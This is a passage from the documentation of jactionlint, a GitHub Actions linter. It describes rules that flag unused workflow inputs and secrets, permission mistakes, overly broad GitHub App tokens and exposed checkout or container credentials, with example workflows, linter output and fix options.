**Configure.** The rule is not in the `default` profile. Run `jactionlint --profile pedantic`, or list the rule under `rules` in [the configuration file](./config.md#rules) to enable it at the level you choose (`error`, `warn` or `info`):

```yaml
rules:
  unused-workflow-input: warn
```

The rule is pedantic because an input can exist for someone else. GitHub refuses a manual run or a `workflow_call` that passes an input the workflow does not declare, so a tool that dispatches the workflow with an input of its own (for example the `distinct_id` that `codex-/return-dispatch` passes) or a caller in another repository needs the input even when the workflow never reads it.

**What is reported.** An input is read as `inputs.<name>`, and for `workflow_dispatch` also as `github.event.inputs.<name>`. A read of the whole context (`toJSON(inputs)`, `inputs[matrix.name]`) counts as a read of every input.

**What is not reported.** The inputs of `workflow_dispatch` when a script reads `$GITHUB_EVENT_PATH` or, in a script of `actions/github-script`, `context.payload.inputs`, because the script can read them from the payload. A workflow in which an expression does not parse is skipped.

**Fix.** There is no automatic fix, because removing an input of `workflow_call` breaks the callers that still pass it. Remove the input, or silence one with `# jactionlint ignore=unused-workflow-input` above the input or at the end of its line, see [ignore comments](./ignore.md#ignore-some-errors).

<a id="check-unused-workflow-secret"></a>
## Unused workflow secrets (pedantic)

`unused-workflow-secret` reports a secret of `on.workflow_call.secrets` that no expression of the workflow reads. A caller has to pass a required secret and passes an optional one for nothing, so every unused secret hands a credential to a workflow that does not need it. The rule is in the `pedantic` profile and reports a warning. It is the sibling of [`unused-workflow-input`](#check-unused-workflow-input).

Example input:

```yaml
on:
  workflow_call:
    secrets:
      token:
        required: true
      npm-token:
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: ./release.sh
        env:
          TOKEN: ${{ secrets.token }}
```

Example config:

```yaml
rules:
  unused-workflow-secret: warn
```

Output:

```
test.yaml:6:7: warning: secret "npm-token" of "workflow_call" is never used: no expression reads "secrets.npm-token". remove it from the workflow and from the callers, so that nothing passes a credential which is not needed, or use it [unused-workflow-secret]
  |
6 |       npm-token:
  |       ^~~~~~~~~~
```

<!-- Skip playground link -->

The output lists only the findings of this rule. To get the same findings for a file of your own, run `jactionlint --select unused-workflow-secret FILE`.

**Configure.** The rule is not in the `default` profile, for the same reason as the inputs: the secret may be passed for a reason that the file does not show. Run `jactionlint --profile pedantic`, or list the rule under `rules` in [the configuration file](./config.md#rules) to enable it at the level you choose (`error`, `warn` or `info`); the example config of this section is such an entry.

**What is reported.** A secret is read as `secrets.<name>` (names are case-insensitive) or `secrets['<name>']`. A read of the whole context (`toJSON(secrets)`, `secrets[matrix.name]`) counts as a read of every secret, and so does a job that calls another workflow with `secrets: inherit`, which passes every secret on. A workflow in which an expression does not parse is skipped.

**Fix.** There is no automatic fix, because removing a secret of `workflow_call` breaks the callers that still pass it. Remove the secret from the workflow and from the callers, or silence one with `# jactionlint ignore=unused-workflow-secret` above the secret or at the end of its line, see [ignore comments](./ignore.md#ignore-some-errors).

<a id="permissions"></a>
<a id="check-permissions"></a>
## Permissions

`invalid-permissions` reports a scope or an access level in `permissions:` that GitHub does not accept. `missing-permissions` reports a job that no `permissions:` covers, see [Require explicit permissions](#require-explicit-permissions).

Example input:

```yaml
on: push

# ERROR: Available values for whole permissions are "read-all", "write-all" or {}
permissions: write

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      # ERROR: "checks" is correct scope name
      check: write
      # ERROR: Available values are "read", "write" or "none"
      issues: readable
      # ERROR: "models" doesn't have "write" scope
      models: write
    steps:
      - run: echo hello
```

Output:

```
test.yaml:4:14: "write" is invalid for permission for all the scopes. available values are "read-all", "write-all" or {} [invalid-permissions]
  |
4 | permissions: write
  |              ^~~~~
test.yaml:11:7: unknown permission scope "check". all available permission scopes are "actions", "artifact-metadata", "attestations", "checks", "code-quality", "contents", "copilot-requests", "deployments", "discussions", "drives", "id-token", "issues", "models", "packages", "pages", "pull-requests", "repository-projects", "security-events", "statuses", "vulnerability-alerts" [invalid-permissions]
   |
11 |       check: write
   |       ^~~~~~
test.yaml:13:15: "readable" is invalid as permission of scope "issues". available values are "read", "write", "none" [invalid-permissions]
   |
13 |       issues: readable
   |               ^~~~~~~~
test.yaml:15:15: "write" is invalid as permission of scope "models". available values are "read", "none" [invalid-permissions]
   |
15 |       models: write
   |               ^~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpMjdENwyAMBf+Z4i3AAmwDxBK0BCMeVtevSJUqX5bu7LP2gGEszg2ZZyWrdgZ8Zl3i3EsTgwOWcO0JTOv0+8iS9WW+xe0u9QxcAMhF8vuu/VAlTRgwJR4xtRufekjjc5VLxj/k9+MAyUVRpDX9DgAfnji8)

The `permissions:` key sets the access of the `GITHUB_TOKEN` at the workflow level or on a job, see [`permissions`](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#permissions). Each scope has its own access levels, and [the reference](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions) lists the available levels and the defaults. `invalid-permissions` checks the scope names and the levels: in the example `permissions: write` is not one of the values for a whole workflow, `check` is not a scope (`checks` is), `readable` is not an access level and the scope `models` has no `write` level. Each finding lists the valid values.

### Require explicit permissions

`missing-permissions` (in the `default` profile) reports a job that is not covered by `permissions:`. When `permissions:` is not set, the `GITHUB_TOKEN` gets the default permissions of the repository or organization, which may be read-write. Setting permissions explicitly follows the principle of least privilege.

**Configure.** To set the level of the rule or to turn it off, use [the configuration file](./config.md#rules):

```yaml
rules:
  missing-permissions: error
```

**What is reported.** Every job that is not covered by `permissions:`: the workflow has no top-level `permissions:` and the job has no `permissions:` of its own. Either of them is enough, and `permissions: {}` (no permissions) counts as explicit. Jobs that call reusable workflows (`uses:`) are checked in the same way, because the caller limits the permissions of the callee. The finding is at the job, so that you see which jobs need a fix.

#### Fixing missing permissions

`jactionlint --fix` adds this to the workflow, right after the `on:` block:

```yaml
permissions:
  contents: read
```

`contents: read` takes every other permission away from `GITHUB_TOKEN`, so it breaks a job that comments on a pull request, pushes a commit, publishes a package or a release and so on. jactionlint cannot see inside the actions and scripts that a job runs. So the fix is **safe** (applied by `--fix`) only when the workflow gives no sign that the token is needed:

- every action of the jobs that have no `permissions:` is a well-known one that only reads the repository (`actions/checkout`, `actions/setup-*`, `actions/cache`, `actions/upload-artifact`, `jdx/mise-action` and a few more)
- the jobs do not call reusable workflows
- the text of the workflow does not mention `GITHUB_TOKEN`, `github.token`, `GH_TOKEN`, the `gh` command, `git push` or `api.github.com`

In every other case the fix is **unsafe** and `--fix=unsafe` applies it, see [fix findings automatically](./fix.md#fix-errors-automatically). Review the result. A script file that the workflow runs and that pushes with the credentials left by `actions/checkout` is not visible, so check such a workflow before you accept the safe fix.

A job whose actions need more than reading the repository gets a `permissions:` block of its own in the same fix, written from the table of [`insufficient-permissions`](#check-insufficient-permissions). For an action whose entry says that the listed scopes are all it needs (`actions/deploy-pages`, `peter-evans/create-pull-request`, `softprops/action-gh-release`, an OIDC login, ...) the job gets `contents: read` and those scopes, because the permissions of a job replace the ones of the workflow. Such a fix grants write access, so it is **unsafe**.

The fix never invents a scope. An action whose entry is not exact (it has more needs in private repositories, or one of several scopes would do) leaves no fix, and so does a job with a `gh` command or a `git push` (or an action that pushes with the credentials of the checkout) that the rule judges: a script may need more than the scope it is known to need. The finding then says why.

A reusable workflow gets different treatment, because the workflow that calls it decides what the token can do, and a callee that asks for more than its caller grants makes GitHub reject the run:

- A workflow whose only event is `workflow_call:` is **not checked**. The callers set `permissions:` (and `missing-permissions` checks them when they are in the repository), and a value in the callee cannot suit callers that grant different permissions.
- A workflow with `workflow_call:` and another event (such as `push:`) is also run directly, so it is still checked. Its finding has a fix, but it is always **unsafe** (applied with `--fix=unsafe` only): a `contents: read` written into the callee breaks every caller with `permissions: {}` or fewer permissions, and the callers are in other files. The message says so. Look at the callers before you apply it, or set the permissions by hand at job level (or `permissions: {}` if the jobs need nothing), and make sure that no caller grants less than the jobs request.

<a id="check-excessive-permissions"></a>
## Excessive permissions

`excessive-permissions` (in the `default` profile) reports permissions of the `GITHUB_TOKEN` that are broader than a job needs: a write scope in the `permissions:` of the workflow, which every job inherits, and `write-all` or `read-all`, which grant a level to every scope.

Example input:

```yaml
on:
  push:
    branches: [main]

# ERROR: every job of the workflow gets these write permissions
permissions:
  contents: write
  id-token: write
  # OK: reading is not reported
  issues: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo build
  publish:
    runs-on: ubuntu-latest
    # OK: write access granted to the job which needs it
    permissions:
      packages: write
    steps:
      - run: echo publish
  everything:
    runs-on: ubuntu-latest
    # ERROR: write-all gives write access to every scope
    permissions: write-all
    steps:
      - run: echo everything
```

Example config:

```yaml
rules:
  excessive-permissions: error
```

Output:

```
test.yaml:7:3: "contents: write" is granted to every job of the workflow, which lets any of them push commits and tags and create or delete releases. set "permissions: {}" at the workflow level and grant "contents: write" only to the job which needs it [excessive-permissions]
  |
7 |   contents: write
  |   ^~~~~~~~~
test.yaml:8:3: "id-token: write" is granted to every job of the workflow, which lets any of them request OIDC tokens to authenticate to cloud providers and package registries. set "permissions: {}" at the workflow level and grant "id-token: write" only to the job which needs it [excessive-permissions]
  |
8 |   id-token: write
  |   ^~~~~~~~~
test.yaml:27:18: "write-all" gives the GITHUB_TOKEN write access to every scope for the whole job. list only the scopes which are needed and set the others to "read" or "none" [excessive-permissions]
   |
27 |     permissions: write-all
   |                  ^~~~~~~~~
```

<!-- Skip playground link -->

The output lists only the findings of this rule. To get the same findings for a file of your own, run `jactionlint --select excessive-permissions FILE`.

**Configure.** To set the level of the rule or to turn it off, use [the configuration file](./config.md#rules); the example config of this section is such an entry.

**What is reported.**

- A write scope in the `permissions:` of the workflow. Every job inherits it, including the jobs that only build or test. The message says what the scope allows (`contents: write` pushes commits and tags, `id-token: write` requests OIDC tokens, `packages: write` publishes packages, and so on). When the workflow runs on `pull_request_target`, `workflow_run` or `issue_comment`, which people without write access can trigger, the message says so.
- `write-all` and `read-all`, at the workflow level or on a job. They grant a level to every scope, including scopes that the job never uses.

In a workflow with exactly one job, the scope is reported too, although the job gets it either way: a job added later inherits a workflow-level scope silently, so the message says that and asks you to grant the scope on the job. On `pull_request_target`, `workflow_run` or `issue_comment`, the message asks whether the job needs the scope instead of asking to move it.

**What is not reported.** Write scopes on a job, because that is where the access should be granted. The best practice is `permissions: {}` at the workflow level and the scopes that a job needs on that job. Read scopes and `none` are not reported either.

**Configure the workflow-level check.** A workflow without a top-level `permissions:` is not reported when its jobs set their own. To report it, turn on `require-workflow-permissions`. Unset, it is on under the `pedantic` profile and off under the others. The finding is at the first key of the workflow:

```yaml
rules:
  excessive-permissions:
    level: warn
    require-workflow-permissions: true
```

**Related.** A job without `permissions:` in a workflow without `permissions:` is the business of [`missing-permissions`](#permissions), which reports the jobs that the default permissions of the repository apply to. For the differences from the audit of the same name in zizmor, see [zizmor parity](./zizmor-parity.md).

To silence one finding, put `# jactionlint ignore=excessive-permissions` above the scope, or list the rule in `paths.*.ignore` of the configuration for the workflows that need it (a release workflow with a single job, for example). See [ignore comments](./ignore.md#ignore-some-errors).

<a id="check-insufficient-permissions"></a>
## Insufficient permissions

`insufficient-permissions` (in the `default` profile) reports a step whose action or command needs a scope that the `permissions:` of the job do not grant, so the step fails.

Example input:

```yaml
on: push

permissions:
  contents: read

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      # ERROR: the job has "contents: read" only, and the upload needs "security-events: write"
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: results.sarif
  deploy:
    runs-on: ubuntu-latest
    permissions:
      pages: write
    steps:
      # ERROR: the OIDC token of the deployment needs "id-token: write" as well
      - uses: actions/deploy-pages@v4
  login:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      # OK: the permissions of the job are what the action needs
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy
          aws-region: us-east-1
```

Output:

```
test.yaml:11:15: github/codeql-action/upload-sarif needs "security-events: write", but the permissions of the workflow (this job sets none) give "security-events: none", so the step fails. grant "security-events: write" in the "permissions:" of the job, which replace the ones of the workflow, so list every scope the job needs [insufficient-permissions]
   |
11 |       - uses: github/codeql-action/upload-sarif@v3
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:20:15: actions/deploy-pages needs "id-token: write", but the permissions of this job give "id-token: none", so the step fails. grant "id-token: write" in the "permissions:" of the job [insufficient-permissions]
   |
20 |       - uses: actions/deploy-pages@v4
   |               ^~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqckF1OwzAQhN99ir2AKf3hz0+9CXKTbbrg7gbvuhG3R3YDqoAKiaco4xnNNyscYCx6cG7EfCRVEtbgADphQzYNkDH2zr3IrunaRa5fgFxYfc2XXWErPkVDtfakhqOeXQAeiqIGGMgOZbfopMe35GNnJLwoY5LYe42Z9tvTeo4ATGSH8PUH0AzPe0pYgbQk05umOYAexyTvf0J9G9ikOFSyKZPhdfAzqi7OPb6FtqeNA0gyEP+nmHpv8op82f3j5teBJvWfUJ3wnoaS0Ve1y9gjG8U0E/5+zSwJvYmPquWIAWLmECcNFI8hLFfrzd39w+PT7XIVqnMefpGvVRkHanvVY1Tzy48BADQitM8=)

Once `permissions:` is set at the workflow level or on a job, every scope that is not listed is `none`, and the job of a workflow without `permissions:` of its own gets the permissions of the workflow, not the ones of the repository. A step whose action needs a scope that the job does not have then fails with "Resource not accessible by integration", or an OIDC login cannot get a token. This is the first failure of a workflow that has been locked down with `permissions:`, and the rule reports it before the run.

**What is checked.** The rule checks the `permissions:` of the job, or of the workflow when the job has none, against a table of well-known actions and a few commands. A workflow where neither sets `permissions:` has the default of the repository, which jactionlint cannot know, so it is not checked (`workflow-call-permissions` cannot read it either, see [caller/callee permissions](#check-caller-callee-permissions-in-workflow-call)). `write-all` grants everything, and a value that is an expression is not judged.

#### Actions whose permission needs are known

The table lists only what the documentation of an action says it needs:

| Action | What it needs |
| --- | --- |
| `actions/deploy-pages` | `pages: write`, `id-token: write` |
| `github/codeql-action/upload-sarif` | `security-events: write` |
| `github/codeql-action/analyze` | `security-events: write`, unless `upload: never` |
| `actions/attest`, `actions/attest-build-provenance` | `id-token: write`, `attestations: write` |
| `actions/stale` | `issues: write` or `pull-requests: write`, unless `debug-only` |
| `actions/labeler`, `marocchino/sticky-pull-request-comment` | `pull-requests: write` or `issues: write` |
| `actions/dependency-review-action` | `pull-requests: write` with `comment-summary-in-pr: always` or `on-failure` |
| `peter-evans/create-pull-request`, `googleapis/release-please-action` | `contents: write`, `pull-requests: write` |
| `softprops/action-gh-release`, `ncipollo/release-action`, `JamesIves/github-pages-deploy-action`, `peaceiris/actions-gh-pages` (with `github_token`) | `contents: write` (`softprops/action-gh-release` also `discussions: write` with `discussion_category_name`) |
| `release-drafter/release-drafter/autolabeler` | `pull-requests: write` |
| `dorny/test-reporter`, `EnricoMi/publish-unit-test-result-action` | `checks: write` |
| `aws-actions/configure-aws-credentials` with `role-to-assume` and no access key, `google-github-actions/auth` with `workload_identity_provider`, `azure/login` with a `client-id` and no `creds`, `pypa/gh-action-pypi-publish` without `password`, `rubygems/configure-rubygems-credentials` with `role-to-assume`, `NuGet/login` | `id-token: write` |

A step is not checked when the action is given a token of its own (`token`, `repo-token`, `github-token`, an SSH key, a deploy key) or when an option says the scope is not used (`debug-only`, `upload: never`, `disable-releaser`), because then the `GITHUB_TOKEN` is not what the step uses. A step with `continue-on-error: true` or an `if:` that is false is not checked either.

#### Commands that need the token of the job

Two kinds of commands in a `run:` script are checked, when the token of the command is the `GITHUB_TOKEN` of the job:

- `gh release create|upload|edit|delete` (`contents: write`), `gh pr create` (`pull-requests: write`), `gh issue create` (`issues: write`), `gh workflow run` and `gh run cancel|rerun` (`actions: write`) with `GH_TOKEN` or `GITHUB_TOKEN` set to `${{ github.token }}` or `${{ secrets.GITHUB_TOKEN }}` in the `env:` of the step, job or workflow. A command with `--repo`, a token written in front of it, a `GH_TOKEN=` in the script, or one that is allowed to fail (`|| true`, a condition) is skipped.
- `git push` (`contents: write`) after an `actions/checkout` step of the job that keeps the credentials (no `token`, `ssh-key`, `repository`, `path`, and no `persist-credentials: false`). A push to a URL or to a remote other than `origin`, a `--dry-run`, a script that changes the directory, and a job that sets up the remote or the credentials of git (`git remote set-url`, `credential.helper`, `insteadOf`, SSH keys) are skipped. `stefanzweifel/git-auto-commit-action` is judged the same way.

**Configure.** The step of `actions/checkout` needs `contents: read` in a private repository only. In a public one the repository can be cloned without the scope. jactionlint does not know which it is, so that check is in the option `pedantic` (on under the `pedantic` profile):

```yaml
rules:
  insufficient-permissions:
    level: error
    pedantic: true
```

**Related.** The fix of [`missing-permissions`](#permissions) uses the same table: when a job without `permissions:` runs an action whose entry says that the listed scopes are all it needs, the fix writes a `permissions:` block with them on the job, next to the `contents: read` of the workflow.

To silence one finding, put `# jactionlint ignore=insufficient-permissions` above the step, see [ignore comments](./ignore.md#ignore-some-errors).

<a id="check-undocumented-permissions"></a>
## Undocumented permissions (pedantic)

`undocumented-permissions` reports a permission scope above `read` that has no comment explaining why it is granted. Permissions are easy to add and never revisited, so a sentence next to each one keeps the list honest and makes a review of the workflow quick. The rule is in the `pedantic` profile and its default level is `info`.

Example input:

```yaml
on: push

permissions:
  contents: write
  # Needed to comment on the release pull request
  pull-requests: write
  issues: write # close stale issues
  packages: read

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - run: echo hello
```

Example config:

```yaml
rules:
  undocumented-permissions: error
```

Output:

```
test.yaml:4:3: permission "contents: write" has no comment explaining why it is needed. add a comment at the end of the line or above it [undocumented-permissions]
  |
4 |   contents: write
  |   ^~~~~~~~~
test.yaml:14:7: permission "id-token: write" has no comment explaining why it is needed. add a comment at the end of the line or above it [undocumented-permissions]
   |
14 |       id-token: write
   |       ^~~~~~~~~
```

<!-- Skip playground link -->

The example runs the rule at the level `error`, so a finding has no level prefix. With the default level, `jactionlint --select undocumented-permissions FILE` prints the same findings, each starting with `info:`.

**Configure.** The rule is not in the `default` profile. Run `jactionlint --profile pedantic`, or list the rule under `rules` in [the configuration file](./config.md#rules) to enable it at the level you choose (`error`, `warn` or `info`); the example config of this section is such an entry.

**What is reported.** A scope counts as documented when a comment is at the end of its line (`issues: write # close stale issues`) or when comment lines are directly above it, with no blank line in between. The comment above `permissions:` does not document the scopes below it. Comments that only configure a tool, such as `# jactionlint ignore=...`, do not explain anything. The rule reports one finding for each scope without a comment, in the `permissions:` of the workflow and of a job.

**What is not reported.** `write-all` and `read-all`, which are the business of [`excessive-permissions`](#check-excessive-permissions), and a scope granted with `none`, because it grants nothing.

**Configure the read scopes.** With the option `include-read`, the scopes granted with `read` need a comment too, except `contents: read`, which every job needs to check out the repository. Unset, the option is on under the `pedantic` profile (where this rule runs by default) and off when you enable the rule in another profile:

```yaml
rules:
  undocumented-permissions:
    level: warn
    include-read: true
```

**Related.** jactionlint reports one finding for each scope without a comment. For the differences from the audit of the same name in zizmor, see [zizmor parity](./zizmor-parity.md).

<a id="check-github-app"></a>
## GitHub App tokens

`github-app` (in the `default` profile) reports a use of [`actions/create-github-app-token`](https://github.com/actions/create-github-app-token), or of one of two other actions that issue app tokens, that issues a token more powerful or longer lived than the job needs. An installation token is not a problem by itself, but the defaults of the action are generous.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: no permission-* input, so the token gets all permissions of the app
      - uses: actions/create-github-app-token@3ff1caaa28b64c9cc276ce0a02e2ff584f3900c5 # v2
        with:
          app-id: ${{ vars.APP_ID }}
          private-key: ${{ secrets.APP_KEY }}
      # ERROR: owner without repositories, and the token is not revoked
      - uses: actions/create-github-app-token@3ff1caaa28b64c9cc276ce0a02e2ff584f3900c5 # v2
        with:
          app-id: ${{ vars.APP_ID }}
          private-key: ${{ secrets.APP_KEY }}
          owner: my-org
          permission-contents: read
          skip-token-revoke: true
```

Output:

```
test.yaml:8:15: no "permission-*" input is set, so the token gets every permission granted to the GitHub App. request only what the job needs, for instance "permission-contents: read" [github-app]
  |
8 |       - uses: actions/create-github-app-token@3ff1caaa28b64c9cc276ce0a02e2ff584f3900c5 # v2
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:17:18: "owner" without "repositories" issues a token with access to every repository of the owner where the app is installed. list the repositories the token is for in "repositories" [github-app]
   |
17 |           owner: my-org
   |                  ^~~~~~
test.yaml:19:30: "skip-token-revoke: true" keeps the GitHub App token valid after the job ends. remove it so that the token is revoked in the post step [github-app]
   |
19 |           skip-token-revoke: true
   |                              ^~~~
```

<!-- Skip playground link -->

The output lists only the findings of this rule. To get the same findings for a file of your own, run `jactionlint --select github-app FILE`.

**Configure.** To set the level of the rule or to turn it off, use [the configuration file](./config.md#rules):

```yaml
rules:
  github-app: error
```

**What is reported.** For `actions/create-github-app-token`:

- No `permission-*` input (such as `permission-contents: read`), which gives the token every permission that the app has been granted on the installation.
- `owner:` without `repositories:`, which gives the token access to every repository of the owner where the app is installed.
- `skip-token-revoke: true`, which keeps the token valid after the job instead of revoking it in the post step.

**What is not reported.** `owner` without `repositories` is not reported when every `permission-*` input is an organization permission (`permission-members`, `permission-organization-*` and the like), because such a token has no repository to list.

**Other actions that issue app tokens.** Two other actions are checked with their own inputs:

- `tibdex/github-app-token` (archived) is reported for no `permissions` (a JSON object like `'{"contents": "read"}'`), which gives the token every permission of the app, for no `repositories` (a JSON array of the repository names without the owner, like `'["repo"]'`), which gives it every repository of the installation, and for `revoke: false`. `repositories` and `revoke` are inputs of version 2: version 1 has `repository` (the current repository by default) and neither of them, and a commit whose version is not in a comment such as `# v2.1.0` is not checked for them.
- `peter-murray/workflow-application-token-action` is reported for no `permissions` (`contents:read,issues:write`), which gives the token every permission of the app, and for a `revoke_token` that is missing or false, because the token is revoked only when it is `true`. The input and the post step that revokes the token are in version 3 and later, so for version 1 and 2 the advice is to upgrade. The action has no list of repositories: `organization` only picks the installation.

Other actions that issue app tokens are not known to the rule.

<a id="check-hardcoded-credentials"></a>
## Hardcoded credentials

The rule `hardcoded-container-credentials` reports a `password:` that is written as plain text in the `credentials:` of `container:` or of a service. It is in the `correctness` profile, so it runs under every profile, at the level `error`.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: 'example.com/owner/image'
      credentials:
        username: user
        # ERROR: Hardcoded password
        password: pass
    services:
      redis:
        image: redis
        credentials:
          username: user
          # ERROR: Hardcoded password
          password: pass
    steps:
      - run: echo 'hello'
```

Output:

```
test.yaml:10:19: "password" section in "container" section should be specified via secrets. do not put password value directly [hardcoded-container-credentials]
   |
10 |         password: pass
   |                   ^~~~
test.yaml:17:21: "password" section in "redis" service should be specified via secrets. do not put password value directly [hardcoded-container-credentials]
   |
17 |           password: pass
   |                     ^~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp0kLFuxSAMRff3Fd6Y0rfzNzxy1VCBjWxo+vkVNKVLOmGd48tFCHuq3Y7Hh7zMP4garI2TSDvbNnx/dW59y2G4qaJwC4mhP5tEqYR3eHL4CqVmvEUpTzkZ+pzGXWtRsYNbCtl+k0TdoBwK/JwWrsHsFN39nCY26GeKWFnFnuzvousRky54W/lv6X1tQ13hbfyLJ8RDyB3IWdz3AFJLXcM=)

A job logs in to a registry with the [`credentials:` of `container:` and of a service](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idcontainercredentials). The password belongs in a secret that the workflow expands with `${{ }}`. The rule reports a `password:` that is not an expression. The `username:` is not checked.

**Fix.** Store the password in a secret and expand it at `password:`, for example `password: ${{ secrets.REGISTRY_PASSWORD }}`. There is no automatic fix.

<a id="check-checkout-static-credentials"></a>
## Static credentials for actions/checkout

The rule `checkout-static-credentials` reports an `actions/checkout` step that is given a credential that does not expire: the `ssh-key` input, or a `token` written in the workflow. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ssh-key: ${{ secrets.DEPLOY_SSH_KEY }}
```

Output:

```
test.yaml:8:11: actions/checkout is given secret "DEPLOY_SSH_KEY" as "ssh-key". this credential does not expire and can reach more than this job needs, and unless "persist-credentials: false" is set it is also left in the git config of the workspace for every later step to read. use the default GITHUB_TOKEN for this repository. to reach other repositories or to push something that starts other workflows, use a short-lived token from a GitHub App (actions/create-github-app-token) or a fine-grained personal access token limited to the repositories it needs, and keep it in a secret of a protected environment [checkout-static-credentials]
  |
8 |           ssh-key: ${{ secrets.DEPLOY_SSH_KEY }}
  |           ^~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNo8yjGLwkAUxPE+n2KKa/euuWqrKy4gKCikShWS9cHGhN2QeU+RkO8uUbGb4f/LyWMyxuKSO/oC6Kwfz9sAZkt0G7DOkpobWxXqM1Fl4ksBDkahRxu0z4k/IUoYsunf9fctgFuv0X8eQEY3yN3ja1lACbMov//L0+FYN1W1a/ZljXV9DADQlS9a)

The default `GITHUB_TOKEN` lasts as long as the job and is limited to the repository, and the token of a GitHub App lasts an hour at most. An SSH key or a personal access token stays valid until somebody rotates it, usually reaches more than the job needs, and `actions/checkout` writes it to the git config of the workspace unless `persist-credentials: false` is set, where every later step can read it.

**Fix.** Use the default token for the repository running the workflow. To reach other repositories or to push something that has to start other workflows, create a short-lived token with [actions/create-github-app-token](https://github.com/actions/create-github-app-token), or use a fine-grained personal access token that is limited to the repositories it needs and kept in a secret of a protected environment (one with required reviewers or a branch restriction). There is no automatic fix.

**Configure.** A `token` that comes from a secret is a personal access token in most cases, and workflows that release or push often have to use one, so it is reported only with the option `secret-tokens`. The option is on under the `pedantic` profile and off under `default`; set it to `true` or `false` to decide. The `ssh-key` input and a literal `token` are always reported. Secrets named in `allow` (case-insensitive) are never reported. A `token` that is `secrets.GITHUB_TOKEN`, `github.token`, the output of a step, an input of a reusable workflow, or has a fallback to one of these, is not reported, because the credential behind it is not known to be static.

```yaml
rules:
  checkout-static-credentials:
    secret-tokens: true
    allow: [DEPLOY_KEY]
```

Turn the rule off with `checkout-static-credentials: off` under `rules`, or ignore one finding with an [ignore comment](ignore.md#ignore-some-errors) (`# jactionlint ignore=checkout-static-credentials`).

**Related.** How this rule compares with zizmor is on the [zizmor parity page](zizmor-parity.md).

<a id="check-artipacked"></a>
## Persisted checkout credentials

The rule `artipacked` reports an `actions/checkout` step that does not set `persist-credentials`. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: the token stays in .git/config for the following steps
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
      - run: tar czf repo.tgz .
      # OK
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
        with:
          persist-credentials: false
          path: other
```

Example config:

```yaml
rules:
  artipacked: error
```

Output:

```
test.yaml:8:15: actions/checkout leaves the GITHUB_TOKEN in the git config of the workspace, where a later step such as an artifact upload can publish it. set "persist-credentials: false" under "with:" unless a later step needs to push [artipacked]
  |
8 |       - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The checkout action stores the `GITHUB_TOKEN` in the git config of the workspace so that later `git` commands can push. Any later step can read it, and a step that copies the workspace, such as `actions/upload-artifact` with `path: .`, publishes it in the artifact (the [ArtiPACKED](https://unit42.paloaltonetworks.com/github-repo-artifacts-leak-tokens/) attack).

**Configure.** The output shows only the findings of this rule; run `jactionlint --select=artipacked` to get the same on your own files. The level of the rule is set under `rules` in the [configuration file](config.md#rules); `error` is the default and `off` turns the rule off; the example config of this section is such an entry.

**Fix.** Set `persist-credentials: false` unless a later step needs to push. An explicit `persist-credentials: true` says that the credential is needed, so it is not reported, and neither is a value given by an expression.

`jactionlint --fix` adds `persist-credentials: false` under `with:` of the step, and creates `with:` when the step has none. The fix is safe, and applied by `--fix`, only when no later step of the job looks like it needs the credential. It is unsafe, and needs `--fix=unsafe`, when:

- a later `run:` script has a `git` command that talks to a remote (`push`, `pull`, `fetch`, `clone`, `remote`, `submodule`, `lfs`, `ls-remote`, `commit` or `tag`);
- a later step uses an action known to push (such as `stefanzweifel/git-auto-commit-action` or `peter-evans/create-pull-request`).

A script that pushes without a visible git command cannot be detected, so check the workflow after you apply the fix.

The fix handles the flow style of YAML. A `with:` written in flow style (`with: { fetch-depth: 0 }`), also over several lines, gets the entry first. A step written in flow style (`- {uses: actions/checkout@v4}`) gets `with: {persist-credentials: false}` in front of its first key, or the entry first in its flow `with:`. Every such edit is verified: the fixed file must parse and the step must have `persist-credentials: false`. A step that the edit cannot be exact for (an anchored mapping or first key, an alias or an empty value for `with:`) is reported without a fix and with a `no_fix` reason: write `persist-credentials: false` there by hand.

**What is not reported.**

- A checkout that a later step of the job pushes with (a `git push` in a script, or an action such as `stefanzweifel/git-auto-commit-action`), when no step uploads the workspace (`path: .`, `..` or `${{ github.workspace }}`): the credential is what the push needs and nothing publishes it. A command is found in the script as a command: `git push` in a comment, in the text of `echo` or `printf`, or in a heredoc is not a push. A command that runs another (`bash -c "git push"`, `xargs git push`, `retry git push`) is matched on its words, and so is a script of a shell that is not bash or sh.
- `actions/checkout@v1`: it has no `persist-credentials` input to set.

<a id="check-secrets-inherit"></a>
## Inherited secrets

The rule `secrets-inherit` reports a job that calls a reusable workflow with `secrets: inherit`. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: push
jobs:
  deploy:
